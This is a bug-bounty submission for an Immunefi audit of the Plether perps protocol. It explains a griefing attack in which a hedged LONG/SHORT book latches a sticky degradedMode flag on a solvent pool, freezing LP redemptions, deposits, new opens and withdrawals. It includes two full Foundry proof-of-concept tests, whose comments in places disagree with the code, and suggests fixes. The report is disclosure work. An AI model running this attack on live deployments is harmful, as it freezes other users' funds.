# \#97832 [SC-High] Permissionless hedged book can latch sticky degradedMode and freeze LP settlement on a solvent pool

**Submitted on Nov 3rd 2026 at 13:43:25 UTC by @vzmahh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97832
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

Two attacker accounts holding a price-neutral LONG+SHORT book can put the protocol into the sticky `degradedMode` latch while the pool is fully solvent. The attacker fills the pool's capacity with a hedged pair, then one leg legitimately wins and is paid in cash, either by an ordinary close or by a keeper liquidation of the thin-margin winner during the Friday FAD window. The latch compares physical cash `E` with `L = max(longMaxProfit, shortMaxProfit)` and does not net the still-open losing leg's collectible receivable, so paying the winner pushes `E < L` although LPs are not worse off.

Once latched, `HousePool.settleLpEpoch` reverts for everyone (no redemption funding, no deposit activation), new LP deposit requests and new opens are rejected, and traders with a live position cannot withdraw free margin. The latch persists after the attacker unwinds and the pool is flat and richer than before. Only the owner can clear it, and while the losing leg is open `clearDegradedMode()` reverts (`StillInsolvent`) until the owner injects the gap `L - E`. No privileged role, oracle cooperation or victim action is needed; keepers are untrusted by the program rules.

## Vulnerability Details

### Root cause

Three facts combine.

1. `CfdEngine._enterDegradedModeIfInsolvent` (`CfdEngine.sol:1351-1369`) runs after every close (`_applyClose`, `:1320`) and liquidation (`_applyLiquidation`, `:1344`). It latches when `_availableCashForFreshPoolPayouts() < _maxLiability()`, where `_maxLiability()` is `max(longState.maxProfitAssets, shortState.maxProfitAssets)` (`:1044-1050`). The right-hand side is a per-side worst-case envelope. The left-hand side is physical cash. The offsetting leg's marked receivable (what the losing leg owes the pool) is in neither, so a hedge that is neutral for LPs still looks like a shortfall once the winner is paid.
2. Open admission only requires `E >= L + B` and the skew guard bounds NET skew (`CfdEnginePlanLib.sol:473-480`, buffer check `:698-779`). A LONG leg and a SHORT leg can therefore each fill the capacity: net skew stays 0, both sides sit at `L` close to `E` (headroom is only `B = 0.25% of L` at release parameters), and the first profitable payout exceeds the headroom.
3. The latch is sticky and owner-only. `clearDegradedMode()` is `onlyOwner` and requires `E >= L` (`CfdEngine.sol:655-667`); `recapitalizePool` explicitly does not clear it (`:627-631`). While latched: `HousePool._settleLpEpoch` calls `_requireWithdrawalsLive` and reverts `HousePool__DegradedMode` (`HousePool.sol:832`, `:1864-1870`), `CfdEngineSettlementSidecar` rejects withdrawals for accounts with a position (`:274-276`), the open plan rejects with `DEGRADED_MODE`, and `TrancheVault.requestDeposit` reverts.

### Attack

Release parameters from `DEPLOYMENT.md` in both PoCs (vpiFactor 1%, maxSkew 40%, maintenance 0.1%, initial 0.2%, FAD margin 3%, settlement buffer 25 bps, fee 4 bps). All trades go through the public Router (`commitOrder` / `executeOrder`); only Pyth payloads and USDG are mocked.

Variant A, voluntary close (PoC A):
1. Account A (LONG) and account B (SHORT) alternate opens, each opening leg below the 40% skew limit, until `E - L` is only the settlement buffer (pool 1,002,000 USDG, `L` 999,500, headroom 2,500).
2. The basket moves about +1.2% (a +0.5% move does not latch; the winner's profit is absorbed by VPI, fees and the buffer).
3. The attacker closes the winning leg. `E` falls to 995,516 and `L` stays 999,500 (the loser leg is still open), so `degradedMode` latches.
4. The attacker closes the losing leg. The pool is now flat and richer: `E` 1,006,849 against `L` 1,000 (a bystander's position). The latch is still set.

Variant B, keeper liquidation (PoC B):
1. Same hedged fill with thin 0.6% margins (pool 412,000 USDG, `L` 410,900, slack 1,100).
2. Basket moves +0.5%, then the Friday FAD window starts (maintenance margin 3%). The attacker tops up the losing LONG leg so `executeLiquidation` on it reverts `PositionIsSolvent`.
3. Any keeper (the attacker can be the keeper) liquidates the thin-margin winning SHORT leg. `E` falls to 410,844 below `L` 410,900 and the latch is set.
4. The attacker closes the loser and ends flat: `E` 412,869, `L` 0, latch still set.

## Impact Details

While latched, for every user of the protocol:
- `router.settleLpEpoch` reverts `HousePool__DegradedMode`, so matured LP redemptions cannot be funded and queued deposits cannot activate. In PoC A free cash exists (`getSettlementFreeAssets() > 0`, flat book, `E >= L + B`) and the call still reverts.
- New LP `requestDeposit` and all new opens are rejected, including for honest traders.
- A bystander trader holding a position cannot withdraw free margin (`CfdEngine__DegradedMode`).
- The latch survives the attacker unwinding; no permissionless path clears it. The owner must call `clearDegradedMode()`, which reverts `StillInsolvent` while the losing leg stays open, so the owner must first `recapitalizePool` at least `L - E` (PoC A: about 3,984 USDG, PoC B: about 56 USDG at these moves; larger basket moves enlarge the gap).

Cost to the attacker is small and the pool ends up richer: net 5,652 USDG on a 1,002,000 USDG pool in PoC A (0.56%), net 1,408 USDG on a 412,000 USDG pool in PoC B (0.34%). Both scale with pool size, and the freeze affects the whole pool. No profit motive is needed.

Severity: Medium by the program table (griefing with no profit motive but damage to users and protocol; temporary freezing of funds for at least 1 hour). The freeze lasts until the trusted owner notices, recapitalises and clears, and there is no permissionless recovery, so it can exceed 24 hours if the owner is slow; I rate it Medium and leave High to the judges.

## Why this is not a known issue

- Not in the three prior reports: the only degraded-mode finding is Cecuro LOW-73 (protection creation is blocked while degraded), a different root cause. The AI scan and the pre-audit do not cover an attacker inducing the latch.
- `SECURITY.md` Known Limitations, Router and keeper limitations and the Pyth clock item do not list it.
- The docs describe the latch as containment of genuine insolvency (`ACCOUNTING_SPEC.md` "Degraded Mode", `WHITEPAPER.md` section 7.5, `SECURITY.md` settlement-liability buffer). In these PoCs the pool is not insolvent: LP assets are intact and the pool ends richer. `E < L` appears only because the trigger compares cash with a per-side envelope that ignores the offsetting leg, and the sticky latch plus owner-only clearing turns that artifact into a protocol-wide freeze. `WHITEPAPER.md` section 10.3 ("`L_max` is not a pathwise reserve") says a profitable close need not be paid immediately; it does not say that an unprivileged hedge can freeze LP settlement and trading.
- It is a legitimate flow, not a trusted-role action: every step is a public call by untrusted accounts or keepers.

## Suggested mitigation

1. Evaluate the trigger on net exposure: include the opposite side's collectible receivable (or compare with the unhedged residual), so a price-neutral book cannot push `E` below `L` by paying the winner.
2. Bound gross hedged exposure at admission, not only net skew (`CfdEnginePlanLib.sol:473-480`), or size `B` against the winning leg's payout.
3. Add a permissionless cure: once `E >= L`, allow anyone to clear the latch (or auto-clear when the book that caused it is flat), keeping owner-only handling for real insolvency.
4. While degraded, let `settleLpEpoch` fund redemptions from `getSettlementFreeAssets()` when it is positive.


## Proof of Concept

## Proof of Concept

Two Foundry tests inside the repo suite, `src` untouched, only Pyth payloads and USDG mocked, forge 1.8.3. Both import `BasePerpTest` from the repo. Copy the two files into `packages/perps/test/perps/poc/latch/` and run from `packages/perps`:

```
forge test --match-path "test/perps/poc/latch/*.t.sol" -vv
```

Expected: 3 tests pass (`test_balancedBookDegradedLatchPersistsAfterSolvencyRestored`, `test_probeCapacity` (capacity helper), `test_poc_attackerForcesStickyDegradedMode`). Decisive assertions:

PoC A, `DegradedLatchGrief.t.sol` (voluntary close, real Router flow):
- `assertFalse(engine.degradedMode())` after filling both legs, then `assertTrue(engine.degradedMode())` after the winner close
- after the loser close: `assertGe(E, _maxLiability())` and `assertTrue(engine.degradedMode(), "latch persists although E >= L")`
- `router.settleLpEpoch` reverts `HousePool__DegradedMode` while `getSettlementFreeAssets() > 0`
- bystander `clearinghouse.withdraw` reverts `CfdEngine__DegradedMode`; a new open is rejected
- logs: `E after: 995516341463`, `L after: 999500000000`, `E restored: 1006848946989`, `attacker net cost (USDG atoms): 5651961999`
- `engine.clearDegradedMode()` (owner) then lets `settleLpEpoch` pass.

PoC B, `DegradedLatchRouterPoC.t.sol` (keeper liquidation in the FAD window, Router `commitOrder` / `executeOrder` / `executeLiquidation` / `updateMarkPrice`):
- `executeLiquidation` on the topped-up loser reverts `PositionIsSolvent`; on the thin winner it succeeds
- `assertTrue(engine.degradedMode())` and `assertLt(e1, l1)`; logs `E after winner liquidation: 410843667332` against `L: 410900000000`
- new open rejected; `settleLpEpoch` reverts `HousePool__DegradedMode`; new LP `requestDeposit` reverts
- attacker closes the loser and ends flat: `E when flat: 412868775175`, `L when flat: 0`, `assertTrue(engine.degradedMode(), "latch persists on a flat, fully solvent pool")`
- `attacker net P&L: -1408325175` atoms; a non-owner `clearDegradedMode()` reverts; after the owner clears it, the honest LP's matured redemption is funded.

Notes: in PoC A the mark refresh before the redemption step is done by pranking the Router (equivalent to `router.updateMarkPrice` with a mock payload); PoC B uses the public `router.updateMarkPrice` throughout. The `_fundJunior` / `_fundTrader` helpers are the repo's own.

### PoC A: test/perps/poc/latch/DegradedLatchGrief.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice liveness-r2 lead L1: a permissionless attacker with a balanced long+short book filling the pool to the
///         E >= L + B admission edge can latch `degradedMode` with a routine +0.5% price move by closing the winning
///         leg, without any real insolvency. The latch survives restoring E >= L (closing the loser leg) and blocks
///         LP epoch settlement (LP exits and deposit activation) and new opens until the owner calls
///         clearDegradedMode().
contract DegradedLatchGriefTest is BasePerpTest {

    address internal attLong = address(0xA77A1);
    address internal attShort = address(0xA77A2);
    address internal lpExit = address(0x1BADCAFE);
    address internal victimTrader = address(0xBEEF01);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Release parameters from packages/perps/DEPLOYMENT.md.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // junior capital is added through lpExit below so it can later request redemption
    }

    uint256 internal px = 1e8;
    uint256 internal totalDeposited;

    function _routedExec() internal returns (OrderV3Types.ExecutionResult memory res) {
        bytes[] memory data = _mockPythUpdateData(px);
        res = router.executeOrder(router.nextExecuteId(), data);
    }

    function _routedOpen(address a, CfdTypes.Side side, uint256 size, uint256 margin) internal returns (bool ok) {
        _fundTrader(a, margin + 2_000e6);
        if (a == attLong || a == attShort) totalDeposited += margin + 2_000e6;
        vm.prank(a);
        try router.commitOrder(side, size, margin, 0, false) {} catch (bytes memory err) {
            emit log_named_bytes("commit revert", err);
            return false;
        }
        OrderV3Types.ExecutionResult memory res = _routedExec();
        (uint256 sz,,,,,,) = engine.positions(a);
        if (!(res.status == OrderV3Types.LifecycleStatus.Executed && sz != 0)) {
            emit log_named_uint("exec status", uint8(res.status));
            emit log_named_uint("terminal reason", uint8(res.terminalReason));
            emit log_named_uint("pending reason", uint8(res.pendingReason));
        }
        return res.status == OrderV3Types.LifecycleStatus.Executed && sz != 0;
    }

    function _routedClose(address a) internal returns (OrderV3Types.ExecutionResult memory res) {
        (uint256 sz,,,, CfdTypes.Side side,,) = engine.positions(a);
        vm.prank(a);
        router.commitOrder(side, sz, 0, 0, true);
        res = _routedExec();
    }

    function test_probeCapacity() public {
        _fundJunior(lpExit, 1_000_000e6);
        emit log_named_uint("pool", pool.totalAssets());
        emit log_named_uint("settlementBufferBps", engine.settlementBufferBps());
        uint256[6] memory sizes = [uint256(250_500e18), 250_000e18, 100_000e18, 200_000e18, 300_000e18, 400_000e18];
        for (uint256 i; i < sizes.length; ++i) {
            bool ok = _routedOpen(address(uint160(0xC0DE00 + i)), CfdTypes.Side.LONG, sizes[i], 10_020e6);
            emit log_named_uint("size", sizes[i] / 1e18);
            emit log_named_uint(" ok", ok ? 1 : 0);
            emit log_named_uint(" maxLiability", _maxLiability());
            if (!ok) break;
        }
    }

    function test_balancedBookDegradedLatchPersistsAfterSolvencyRestored() public {
        // LP capital: junior LP funds 1,000,000 USDG (after seeds the pool holds ~1,002,000).
        _fundJunior(lpExit, 1_000_000e6);
        uint256 poolAssets = pool.totalAssets();
        emit log_named_uint("pool totalAssets", poolAssets);

        // Build a balanced book by alternating increments (skew limit 0.4 of depth per net side).
        uint256 chunk = (poolAssets * 25) / 100 / 1e12 * 1e12; // ~0.25P in 18-dec size units at price 1.0
        uint256 sizeUnit = 100e18;
        uint256 chunkSize = (poolAssets / 4 / 1e6) * 1e18; // tokens (18dec) ~ P/4 at price 1
        chunkSize = (chunkSize / sizeUnit) * sizeUnit;
        chunk;
        uint256 marginPer = (poolAssets / 100); // 1% of P per chunk, generous

        // A bystander trader holds a small position (to show trader-side effects of the latch).
        assertTrue(_routedOpen(victimTrader, CfdTypes.Side.LONG, 1_000e18, 100e6), "victim position");

        // Fill both legs up to the E >= L + B admission edge, shrinking the increment when a leg is rejected.
        uint256 step = chunkSize;
        uint256 guard;
        while (step >= sizeUnit && guard++ < 60) {
            bool a = _routedOpen(attLong, CfdTypes.Side.LONG, step, marginPer / 2);
            bool b = _routedOpen(attShort, CfdTypes.Side.SHORT, step, marginPer / 2);
            if (!a || !b) {
                step = (step / 2 / sizeUnit) * sizeUnit;
            }
        }
        emit log_named_uint("rounds", guard);
        emit log_named_uint("maxLiability after fill", _maxLiability());
        emit log_named_uint("pool totalAssets", pool.totalAssets());
        emit log_named_uint("degraded", engine.degradedMode() ? 1 : 0);

        uint256 L = _maxLiability();
        uint256 P = pool.totalAssets();
        emit log_named_uint("L (max side maxProfit)", L);
        emit log_named_uint("E = totalAssets - claims", P - engine.totalTraderClaimBalanceAssets());
        emit log_named_uint("headroom E - L", P - engine.totalTraderClaimBalanceAssets() - L);
        assertFalse(engine.degradedMode(), "not yet degraded");

        // Routine +0.5% basket move; the attacker closes the winning (long) leg.
        px = 1.012e8;
        OrderV3Types.ExecutionResult memory res = _routedClose(attShort);
        emit log_named_uint("close long status (2=Executed?)", uint8(res.status));
        emit log_named_uint("degraded after winner close", engine.degradedMode() ? 1 : 0);
        emit log_named_uint("E after", pool.totalAssets() - engine.totalTraderClaimBalanceAssets());
        emit log_named_uint("L after", _maxLiability());

        // Close the losing leg: value flows back to the pool; raw solvency E >= L is restored.
        res = _routedClose(attLong);
        emit log_named_uint("close long status", uint8(res.status));
        uint256 E = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        emit log_named_uint("E restored", E);
        emit log_named_uint("L restored", _maxLiability());
        emit log_named_uint("degraded after solvency restored", engine.degradedMode() ? 1 : 0);
        assertGe(E, _maxLiability(), "raw solvency restored");
        assertTrue(engine.degradedMode(), "latch persists although E >= L");

        // Consequence 1: LP exit cannot be funded (the LP has been vested > 1h and requests a redemption).
        vm.warp(block.timestamp + 2 hours);
        vm.prank(address(router));
        engine.updateMarkPrice(px, uint64(block.timestamp));
        uint256 shares = juniorVault.balanceOf(lpExit);
        vm.prank(lpExit);
        uint256 rid = juniorVault.requestRedeem(shares / 2, lpExit, lpExit);
        vm.warp(pool.lpEpochStart(rid) + 1);
        vm.prank(address(router));
        engine.updateMarkPrice(px, uint64(block.timestamp));
        assertGt(pool.getSettlementFreeAssets(), 0, "free cash exists (flat book, E >= L + B)");
        bytes[] memory settleData = new bytes[](1);
        settleData[0] = abi.encode(px);
        vm.expectRevert(abi.encodeWithSignature("HousePool__DegradedMode()"));
        router.settleLpEpoch(settleData);

        // Consequence 1b: the bystander cannot withdraw free margin while holding a position.
        vm.prank(victimTrader);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victimTrader, 1);

        // Attacker cost: total settlement left vs deposited.
        uint256 deposited = totalDeposited;
        uint256 left = clearinghouse.balanceAssets(attLong) + clearinghouse.balanceAssets(attShort);
        emit log_named_uint("attacker deposited (USDG atoms)", deposited);
        emit log_named_uint("attacker left (USDG atoms)", left);
        emit log_named_uint("attacker net cost (USDG atoms)", deposited > left ? deposited - left : 0);

        // Consequence 2: new opens blocked (even though E >= L + B).
        (bool opened) = _routedOpen(victimTrader, CfdTypes.Side.LONG, 1_000e18, 100e6);
        assertFalse(opened, "opens blocked while latched");

        // Only the owner (trusted) can lift it.
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());
        router.settleLpEpoch(settleData);
    }

}
```

### PoC B: test/perps/poc/latch/DegradedLatchRouterPoC.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

/// @notice Attacker-forced, sticky, protocol-wide degraded mode with RELEASE parameters, through the public Router.
///
///  1. The attacker opens a perfectly hedged LONG/SHORT book until pool capacity is used (E - L = settlement buffer).
///  2. The market moves ~0.5% before the Friday FAD window. In FAD the maintenance margin is 3%, so the thin-margin
///     winner leg (SHORT) is liquidatable. The attacker tops up the loser leg (LONG) so it is NOT liquidatable.
///  3. ANY keeper liquidates the winner: its price gain is paid from the pool WITHOUT any matching reduction of
///     L = max(longMaxProfit, shortMaxProfit) (the larger side is the loser, still open), so E < L and
///     `degradedMode` latches although the attacker's book is price-neutral and LPs carry no extra risk.
///  4. The latch blocks new opens, LP epoch settlement (redeem funding + deposit activation), pending-deposit
///     cancellation and trader withdrawals with a live position, and survives the book being fully unwound.
///     Only the owner can clear it.
contract DegradedLatchRouterPoC is BasePerpTest {

    address internal constant ATT_LONG = address(0xA77A);
    address internal constant ATT_SHORT = address(0xB77B);
    address internal constant KEEPER = address(0xCAFE);
    address internal constant HONEST_TRADER = address(0x7777);
    address internal constant HONEST_LP = address(0x1111);

    // 2024-03-08 (Friday) 21:30:00 UTC = FAD start (New York standard time, 17:00 EST close at 22:00 UTC)
    uint256 internal constant FRIDAY_FAD = 1_709_933_400;

    uint256 internal price = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md release parameters
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 400_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ---------------------------------------------------------------- helpers

    function routerPair(uint256 lots, uint256 marginBps) external {
        _routerOpen(ATT_LONG, CfdTypes.Side.LONG, lots, marginBps);
        _routerOpen(ATT_SHORT, CfdTypes.Side.SHORT, lots, marginBps);
    }

    function _routerOpen(address account, CfdTypes.Side side, uint256 lots, uint256 marginBps) internal {
        uint256 size = lots * 100e18;
        uint256 margin = (lots * 100e6 * marginBps) / 10_000 + 3e6;
        vm.prank(account);
        router.commitOrder(side, size, margin, 0, false);
        uint64 id = router.nextCommitId() - 1;
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeOrder{value: 1}(id, data);
        (uint256 got,,,,,,) = engine.positions(account);
        require(got != 0, "open did not execute");
    }

    function _refreshMark(uint256 p) internal {
        price = p;
        bytes[] memory data = _mockPythUpdateData(p);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: 1}(data);
    }

    function _slack() internal view returns (uint256 e, uint256 l) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        e = p > c ? p - c : 0;
        l = _maxLiability();
    }

    function _attackerWealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(ATT_LONG) + clearinghouse.balanceAssets(ATT_SHORT)
            + settlementToken.balanceOf(ATT_LONG) + settlementToken.balanceOf(ATT_SHORT);
    }

    // ---------------------------------------------------------------- PoC

    function test_poc_attackerForcesStickyDegradedMode() public {
        vm.deal(KEEPER, 10 ether);
        // honest LP: deposit, activate, then request a full redemption that matures before the attack
        settlementToken.mint(HONEST_LP, 10_000e6);
        vm.startPrank(HONEST_LP);
        settlementToken.approve(address(juniorVault), 10_000e6);
        uint256 depId = juniorVault.requestDeposit(10_000e6, HONEST_LP, HONEST_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depId) + 1);
        _refreshMark(1e8);
        _settleLpEpochForTest();
        vm.startPrank(HONEST_LP);
        juniorVault.claimDeposit(depId, 10_000e6, HONEST_LP, HONEST_LP);
        vm.warp(block.timestamp + 1 hours + 1);
        uint256 redeemId = juniorVault.requestRedeem(juniorVault.balanceOf(HONEST_LP), HONEST_LP, HONEST_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(redeemId) + 1); // matured, intentionally left unsettled

        _fundTrader(ATT_LONG, 5_000_000e6);
        _fundTrader(ATT_SHORT, 5_000_000e6);
        uint256 wealth0 = _attackerWealth();

        // (1) hedged book up to pool capacity, thin (0.6%) margins; skew never exceeds 40% of depth per slice
        uint256[4] memory sizes = [uint256(400), 40, 4, 1];
        for (uint256 s; s < sizes.length; ++s) {
            for (uint256 i; i < 60; ++i) {
                try this.routerPair(sizes[s], 60) {} catch { break; }
            }
        }
        (uint256 e0, uint256 l0) = _slack();
        emit log_named_uint("pool E (net of claims), USDG atoms", e0);
        emit log_named_uint("max side liability L", l0);
        emit log_named_uint("slack E - L (settlement buffer)", e0 - l0);
        assertFalse(engine.degradedMode());

        // (2) market moves +0.5%, then the Friday FAD window starts (maintenance margin 3%)
        vm.warp(FRIDAY_FAD);
        assertTrue(engine.isFadWindow() && !engine.isOracleFrozen());
        _refreshMark(1.005e8);

        // attacker protects the LOSING leg (LONG) from FAD liquidation by topping up its margin
        (uint256 longSize,,,,,,) = engine.positions(ATT_LONG);
        vm.prank(ATT_LONG);
        engine.addMargin(ATT_LONG, (longSize * price / 1e20) * 6 / 100);

        // (3) any keeper liquidates the winning SHORT leg (thin margin < 3% FAD requirement)
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(ATT_LONG, data);

        data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.executeLiquidation{value: 1}(ATT_SHORT, data);

        (uint256 e1, uint256 l1) = _slack();
        emit log_named_uint("E after winner liquidation", e1);
        emit log_named_uint("L after winner liquidation", l1);
        assertTrue(engine.degradedMode(), "degraded mode latched");
        assertLt(e1, l1, "E < L");

        // (4a) new risk is rejected for everybody
        _fundTrader(HONEST_TRADER, 100_000e6);
        vm.prank(HONEST_TRADER);
        vm.expectRevert();
        router.commitOrder(CfdTypes.Side.LONG, 100e18, 10e6, 1e8, false);

        // (4b) LP epoch settlement is blocked: the honest LP's matured redemption cannot be funded and new LP
        //      deposits cannot even be requested
        _refreshMark(price);
        bytes[] memory settleData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        vm.expectRevert(abi.encodeWithSignature("HousePool__DegradedMode()"));
        router.settleLpEpoch{value: 1}(settleData);
        {
            address newLp = address(0x2222);
            settlementToken.mint(newLp, 1_000e6);
            vm.startPrank(newLp);
            settlementToken.approve(address(juniorVault), 1_000e6);
            vm.expectRevert();
            juniorVault.requestDeposit(1_000e6, newLp, newLp);
            vm.stopPrank();
        }

        // (5) attacker unwinds everything; the pool becomes flat and fully solvent but the latch persists
        {
            (uint256 sz,,,,,,) = engine.positions(ATT_LONG);
            vm.prank(ATT_LONG);
            router.commitOrder(CfdTypes.Side.LONG, sz, 0, 0, true);
            uint64 id = router.nextCommitId() - 1;
            vm.roll(vm.getBlockNumber() + 1);
            bytes[] memory closeData = _mockPythUpdateData(price);
            vm.prank(KEEPER);
            router.executeOrder{value: 1}(id, closeData);
            (sz,,,,,,) = engine.positions(ATT_LONG);
            assertEq(sz, 0, "attacker flat");
        }
        (uint256 e2, uint256 l2) = _slack();
        emit log_named_uint("E when flat", e2);
        emit log_named_uint("L when flat", l2);
        assertEq(l2, 0);
        assertTrue(engine.degradedMode(), "latch persists on a flat, fully solvent pool");
        emit log_named_int(
            "attacker net P&L, USDG atoms (cost of the attack)", int256(_attackerWealth()) - int256(wealth0)
        );

        // only the owner can lift it
        vm.prank(address(0xBEEF));
        vm.expectRevert();
        engine.clearDegradedMode();
        engine.clearDegradedMode(); // test contract is the owner
        assertFalse(engine.degradedMode());
        assertEq(juniorVault.claimableRedeemAssets(redeemId, HONEST_LP), 0, "not yet funded");
        _refreshMark(price);
        bytes[] memory settleData2 = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch{value: 1}(settleData2);
        assertGt(juniorVault.claimableRedeemAssets(redeemId, HONEST_LP), 0, "redemption funded once the latch is lifted");
    }

}
```

